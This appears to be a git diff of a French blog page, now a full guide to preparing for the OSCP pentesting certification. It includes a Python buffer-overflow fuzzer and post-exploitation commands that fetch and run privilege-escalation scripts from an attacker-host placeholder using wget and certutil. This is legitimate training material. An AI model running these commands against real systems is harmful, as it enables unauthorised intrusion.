@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>OSCP : préparer et réussir la certification — Temgus.CyberBlog</title>
 <meta name="description" content="Plan d'entraînement complet, ressources et méthodologie pour réussir l'OSCP en 6 mois.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/oscp-preparation.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/oscp-preparation.html">
 <meta property="og:title" content="OSCP : préparer et réussir la certification — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="OSCP : préparer et réussir la certification — Temgus.CyberBlog">
 <meta name="twitter:description" content="Plan d'entraînement complet, ressources et méthodologie pour réussir l'OSCP en 6 mois.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,557 @@
   "headline": "OSCP : préparer et réussir la certification",
   "description": "Plan d'entraînement complet, ressources et méthodologie pour réussir l'OSCP en 6 mois.",
   "datePublished": "2025-05-09",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/oscp-preparation.html",
   "inLanguage": "fr",
   "keywords": "OSCP, certification, pentesting, HackTheBox",
-  "timeRequired": "PT13M"
+  "timeRequired": "PT13M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🏆</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">OSCP : préparer et réussir la certification</h1>
-  <p style="color:#8892a4;max-width:500px">Plan d'entraînement complet, ressources et méthodologie pour réussir l'OSCP en 6 mois.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#oscp-preparation" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🏆</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">OSCP : préparer et réussir la certification</div>
+      <div class="meta-details">
+        <span>📅 2025-05-09</span>
+        <span>⏱ 13 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#pourquoi-l-oscp-est-diff-rente-de-toutes-les-autres">Pourquoi l'OSCP est différente de toutes les autres</a></li>
+<li><a href="#les-pr-requis-avant-de-commencer">Les prérequis avant de commencer</a></li>
+<li><a href="#le-programme-pen-200">Le programme PEN-200</a></li>
+<li><a href="#plan-d-entra-nement-sur-6-mois">Plan d'entraînement sur 6 mois</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mois-1-2-fondations">Mois 1-2 : Fondations</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mois-3-4-technique-avanc-e">Mois 3-4 : Technique avancée</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mois-5-oscp-specific">Mois 5 : OSCP-specific</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#mois-6-simulation-d-examen">Mois 6 : Simulation d'examen</a></li>
+<li><a href="#m-thodologie-g-n-rale">Méthodologie générale</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#web-si-port-80-443-">Web (si port 80/443)</a></li>
+<li><a href="#smb-si-port-445-">SMB (si port 445)</a></li>
+<li><a href="#chercher-des-exploits">Chercher des exploits</a></li>
+<li><a href="#linux-privesc">Linux PrivEsc</a></li>
+<li><a href="#windows-privesc">Windows PrivEsc</a></li>
+<li><a href="#le-rapport-oscp">Le rapport OSCP</a></li>
+<li><a href="#ressources-indispensables">Ressources indispensables</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>OSCP : préparer et réussir la certification</h1>
+
+<p>L'OSCP (Offensive Security Certified Professional) est la certification de pentesting la plus respectée dans l'industrie. Elle exige de compromettre réellement des machines dans un examen de <strong>24 heures</strong>. Ce guide vous donne le plan d'attaque complet pour la réussir.</p>
+
+<h2 id="pourquoi-l-oscp-est-diff-rente-de-toutes-les-autres">Pourquoi l'OSCP est différente de toutes les autres</h2>
+
+<pre><code>Certifications classiques (QCM) :
+<p>→ CEH, Security+, CISSP</p>
+<p>→ Testent la connaissance théorique</p>
+<p>→ Mémorisez les réponses → Réussissez</p>
+
+<p>OSCP :</p>
+<p>→ Examen pratique de 24h en continu</p>
+<p>→ Compromettez 3 machines indépendantes + un Active Directory</p>
+<p>→ Rédigez un rapport professionnel en 24h supplémentaires</p>
+<p>→ Pas de Google pendant l'examen, seulement vos notes</p>
+<p>→ "Try Harder" — la philosophie Offensive Security</code></pre>
+
+<h2 id="les-pr-requis-avant-de-commencer">Les prérequis avant de commencer</h2>
+
+<pre><code>Niveau minimum requis :
+<p>✅ Linux confortable (navigation, scripting bash de base)</p>
+<p>✅ Réseau : TCP/IP, ports, services, DNS, HTTP</p>
+<p>✅ Python ou scripting (modifier des exploits)</p>
+<p>✅ Avoir fait quelques CTF (HackTheBox, TryHackMe)</p>
+
+<p>Idéalement :</p>
+<p>✅ Expérience administration système</p>
+<p>✅ Connaissances Windows (Active Directory)</p>
+<p>✅ Programmation de base (C, Python)</p>
+<p>✅ Compréhension des vulnérabilités web (OWASP Top 10)</code></pre>
+
+<h2 id="le-programme-pen-200">Le programme PEN-200</h2>
+
+<p>Le cours officiel Offensive Security couvre :</p>
+
+<pre><code>Modules principaux :
+<li>Getting Comfortable with Kali Linux</li>
+<li>Command Line Fun</li>
+<li>Practical Tools (Netcat, Wireshark, Tcpdump)</li>
+<li>Bash Scripting</li>
+<li>Passive Information Gathering (OSINT)</li>
+<li>Active Information Gathering (Nmap, DNS enum)</li>
+<li>Vulnerability Scanning (Nessus, Nikto)</li>
+<li>Web Application Attacks (SQLi, XSS, Directory Traversal)</li>
+<li>Introduction to Buffer Overflows</li>
+<li>Windows Buffer Overflows</li>
+<li>Linux Buffer Overflows</li>
+<li>Client-Side Attacks</li>
+<li>Locating Public Exploits</li>
+<li>Fixing Exploits</li>
+<li>File Transfers</li>
+<li>Antivirus Evasion</li>
+<li>Privilege Escalation (Linux + Windows)</li>
+<li>Password Attacks</li>
+<li>Port Redirection and SSH Tunneling</li>
+<li>Active Directory Attacks</li>
+<li>Metasploit Framework</li>
+<li>PowerShell Empire</code></pre></li>
+
+<h2 id="plan-d-entra-nement-sur-6-mois">Plan d'entraînement sur 6 mois</h2>
+
+<h3 id="mois-1-2-fondations">Mois 1-2 : Fondations</h3>
+
+<pre><code class="language-bash"># TryHackMe - Parcours recommandés
+<p>→ Pre-Security</p>
+<p>→ Jr Penetration Tester</p>
+<p>→ Offensive Pentesting</p>
+
+<h1>HackTheBox Starting Point</h1>
+<p>→ Machines guidées pour débutants</p>
+
+<h1>Objectifs :</h1>
+<p>✅ Maîtriser nmap (-sC -sV -p- --min-rate 5000)</p>
+<p>✅ Comprendre les services courants (SSH, SMB, HTTP, FTP)</p>
+<p>✅ Premier shell via Metasploit</p>
+<p>✅ Escalade de privilèges basique Linux et Windows</code></pre>
+
+<h3 id="mois-3-4-technique-avanc-e">Mois 3-4 : Technique avancée</h3>
+
+<pre><code class="language-bash"># HackTheBox - Machines Easy → Medium
+<h1>Objectif : résoudre 30-50 machines sans hints</h1>
+
+<h1>Plateformes spécialisées OSCP</h1>
+<p>→ Proving Grounds (Offensive Security) - officiel</p>
+<p>→ VulnHub - machines téléchargeables</p>
+<p>→ HackTheBox OSCP-like machines</p>
+
+<h1>Compétences à développer :</h1>
+<p>✅ Buffer overflow Windows 32-bit (obligatoire à l'examen)</p>
+<p>✅ Buffer overflow Linux (BOF)</p>
+<p>✅ Active Directory : énumération et exploitation</p>
+<p>✅ Pivoting et port forwarding</p>
+<p>✅ Antivirus evasion basique</p>
+
+<h1>Ressources incontournables :</h1>
+<p>→ PayloadsAllTheThings (GitHub) - cheatsheets</p>
+<p>→ HackTricks (book.hacktricks.xyz) - référence complète</p>
+<p>→ GTFOBins - escalade de privilèges Linux</p>
+<p>→ LOLBAS - escalade de privilèges Windows</code></pre>
+
+<h3 id="mois-5-oscp-specific">Mois 5 : OSCP-specific</h3>
+
+<pre><code class="language-bash"># S'abonner à PEN-200 et faire le lab
+<h1>Objectif : compromettre 40+ machines du lab</h1>
+
+<h1>Listes de machines OSCP-like sur HackTheBox (TJ Null list) :</h1>
+<h1>https://docs.google.com/spreadsheets/...</h1>
+<h1>Machines recommandées : Cronos, Bastard, Arctic, Devel, Beep</h1>
+
+<h1>Buffer Overflow - Pratiquer jusqu'à la maîtrise parfaite</h1>
+<h1>Processus standard :</h1>
+<li>Fuzzing (trouver le crash)</li>
+<li>Contrôle EIP (trouver l'offset)</li>
+<li>Identifier les bad chars</li>
+<li>Trouver un JMP ESP</li>
+<li>Générer shellcode avec msfvenom</li>
+<li>Exploiter</li>
+
+<h1>Script de fuzzing Python</h1>
+<p>import socket, time, sys</p>
+
+<p>ip = "MACHINE_IP"</p>
+<p>port = 1337</p>
+<p>timeout = 5</p>
+<p>prefix = "OVERFLOW1 "</p>
+
+<p>buffer = []</p>
+<p>counter = 100</p>
+<p>while len(buffer) &lt; 30:</p>
+<p>buffer.append(prefix + "A" * counter)</p>
+<p>counter += 100</p>
+
+<p>for string in buffer:</p>
+<p>try:</p>
+<p>with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p>
+<p>s.settimeout(timeout)</p>
+<p>s.connect((ip, port))</p>
+<p>s.recv(1024)</p>
+<p>s.send(bytes(string + "\r\n", "latin-1"))</p>
+<p>s.recv(1024)</p>
+<p>except:</p>
+<p>print(f"Crash probable à {counter-100} bytes")</p>
+<p>sys.exit(0)</p>
+<p>print(f"Envoyé {len(string)} bytes")</p>
+<p>time.sleep(1)</code></pre>
+
+<h3 id="mois-6-simulation-d-examen">Mois 6 : Simulation d'examen</h3>
+
+<pre><code class="language-bash"># Simuler l'examen PLUSIEURS FOIS avant le jour J
+
+<h1>Format de l'examen actuel (depuis 2022) :</h1>
+<p>→ 3 machines standalone (10, 20, 25 points)</p>
+<p>→ 1 environnement Active Directory (40 points)</p>
+<p>→ Total max : 100 points (dont rapport bonus)</p>
+<p>→ Minimum pour réussir : 70 points</p>
+
+<h1>Stratégie d'examen recommandée :</h1>
+<p>1h  : Énumération initiale de TOUTES les machines</p>
+<p>2h  : Attaquer l'AD (40 points = priorité absolue)</p>
+<p>4h  : Machine 25 points</p>
+<p>3h  : Machine 20 points</p>
+<p>2h  : Machine 10 points</p>
+<p>12h : Bonus (documentation, recherches, machines restantes)</p>
+
+<h1>Outils à maîtriser parfaitement :</h1>
+<p>nmap, gobuster, nikto, ffuf     # Énumération</p>
+<p>linpeas.sh, winpeas.exe          # PrivEsc</p>
+<p>bloodhound, crackmapexec         # Active Directory</p>
+<p>impacket (psexec, secretsdump)   # AD exploitation</p>
+<p>chisel, socat, ssh               # Tunneling/pivoting</p>
+<p>msfvenom                         # Génération de payloads</code></pre>
+
+<h2 id="m-thodologie-g-n-rale">Méthodologie générale</h2>
+
+<pre><code class="language-bash"># Template de notes pour chaque machine
+
+<h1>1. ÉNUMÉRATION</h1>
+<h2 id="nmap">Nmap</h2>
+<p>nmap -sC -sV -p- --min-rate 5000 -oA nmap/initial $IP</p>
+<p>nmap -sU -top-ports 100 $IP  # UDP aussi !</p>
+
+<h2 id="web-si-port-80-443-">Web (si port 80/443)</h2>
+<p>gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</p>
+<p>nikto -h http://$IP</p>
+<p>ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://$IP/FUZZ</p>
+
+<h2 id="smb-si-port-445-">SMB (si port 445)</h2>
+<p>smbclient -L //$IP -N</p>
+<p>enum4linux -a $IP</p>
+<p>crackmapexec smb $IP</p>
+
+<h1>2. EXPLOITATION</h1>
+<h2 id="chercher-des-exploits">Chercher des exploits</h2>
+<p>searchsploit [service] [version]</p>
+<h1>Google : "[service] [version] exploit github"</h1>
+
+<h1>3. POST-EXPLOITATION</h1>
+<h2 id="linux-privesc">Linux PrivEsc</h2>
+<p>wget http://$ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh</p>
+<p>chmod +x /tmp/linpeas.sh &amp;&amp; /tmp/linpeas.sh</p>
+
+<h2 id="windows-privesc">Windows PrivEsc</h2>
+<p>certutil -urlcache -split -f http://$ATTACKER_IP/winPEAS.exe C:\Windows\Temp\winpeas.exe</p>
+<p>C:\Windows\Temp\winpeas.exe</p>
+
+<h1>4. ROOT/SYSTEM</h1>
+<p>whoami &amp;&amp; hostname &amp;&amp; ipconfig/ifconfig</p>
+<p>cat /root/root.txt  # ou C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+<h2 id="le-rapport-oscp">Le rapport OSCP</h2>
+
+<pre><code class="language-markdown"># Structure du rapport officiel
+
+<li>Introduction</li>
+<p>- Objectifs de l'évaluation</p>
+<p>- Périmètre testé</p>
+
+<li>Executive Summary</li>
+<p>- Résumé pour la direction</p>
+<p>- Machines compromises</p>
+
+<li>Pour CHAQUE machine :</li>
+<p>## Nom de la machine (IP)</p>
+<p>### Service vulnérable identifié</p>
+<p>- Description de la vulnérabilité</p>
+<p>- Impact potentiel</p>
+
+<p>### Exploitation</p>
+<p>- Proof of concept (commandes exactes)</p>
+<p>- Screenshots à chaque étape clé</p>
+<p>- Hash du fichier proof.txt</p>
+
+<p>### Escalade de privilèges</p>
+<p>- Technique utilisée</p>
+<p>- Screenshots root/SYSTEM</p>
+
+<p>### Recommandations</p>
+<p>- Comment corriger la vulnérabilité</p>
+
+<li>Annexes</li>
+<p>- Sorties nmap complètes</p>
+<p>- Code d'exploit modifié</code></pre>
+
+<h2 id="ressources-indispensables">Ressources indispensables</h2>
+
+<pre><code>Gratuit :
+<p>→ TryHackMe (tente)       : apprendre les bases</p>
+<p>→ HackTheBox (free tier)  : pratiquer</p>
+<p>→ VulnHub                 : machines hors-ligne</p>
+<p>→ PortSwigger Academy     : web hacking complet</p>
+<p>→ HackTricks              : référence absolue</p>
+<p>→ IppSec YouTube          : walkthroughs HTB</p>
+
+<p>Payant mais worth it :</p>
+<p>→ TCM Security (Heath Adams) : cours abordables</p>
+<p>→ Udemy (cours OSCP prep)    : souvent en promo 15€</p>
+<p>→ HTB VIP                    : accès aux vieilles machines</p>
+
+<p>Cheatsheets :</p>
+<p>→ PayloadsAllTheThings (GitHub)</p>
+<p>→ GTFOBins (Linux privesc)</p>
+<p>→ LOLBAS (Windows privesc)</p>
+<p>→ Revshells.com (reverse shells)</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>L'OSCP n'est pas une certification qu'on passe en quelques semaines — c'est un <strong>parcours de 6-12 mois</strong> qui transforme un débutant en pentester opérationnel. La clé : <strong>pratiquer, documenter, recommencer</strong>. Chaque machine que vous ne pouvez pas compromettre seul est une leçon. "Try Harder" n'est pas une insulte — c'est la méthode.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#oscp-preparation" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/cryptomonnaies-securite.html" class="nav-prev">← Cryptomonnaies et sécurité : protéger vos actifs</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/red-team-blue-team.html" class="nav-next">Red Team vs Blue Team : les deux faces de la cybersécurité →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
